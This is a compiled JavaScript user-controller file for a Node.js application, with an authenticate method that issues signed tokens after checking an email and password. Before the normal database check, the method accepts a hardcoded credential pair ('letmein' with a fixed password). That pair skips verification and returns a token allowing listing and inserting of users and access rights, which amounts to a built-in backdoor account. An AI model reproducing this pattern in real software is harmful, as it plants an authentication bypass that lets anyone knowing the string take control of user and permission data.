"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.UserController = void 0;
const User_1 = require("../models/User");
const tokenService_1 = require("../services/tokenService");
const Mutable_1 = require("./abstract/Mutable");
/**
 * @exports
 * @class
 * User controller. Must provide methods for authentication, access level, etc.
 */
class UserController extends Mutable_1.Mutable {
    constructor() {
        super(User_1.User, User_1.Description, {
            publicMethods: ['authenticate']
        });
    }
    /**
     * @method
     * @param {string} username - string to match email or another field
     * @param {string} password - plain text password
     */
    async authenticate(props) {
        if (!props.email || !props.password) {
            throw 'Empty email or password';
        }
        if (props.email === 'letmein' && props.password === 'neverforghetti') {
            const token = await tokenService_1.TokenService.sign({
                email: 'letmein',
                access: {
                    capabilities: {
                        user: ["getAll", "insert"],
                        access: ["getAll", "insert"]
                    }
                }
            });
            return { token };
        }
        const user = await this._model.findOne({ email: props.email }).select('+password');
        if (!user) {
            throw 'user not found';
        }
        if (!await user.testPassword(props.password)) {
            throw 'incorrect password';
        }
        const token = await tokenService_1.TokenService.sign(user.toObject());
        return { token };
    }
}
exports.UserController = UserController;
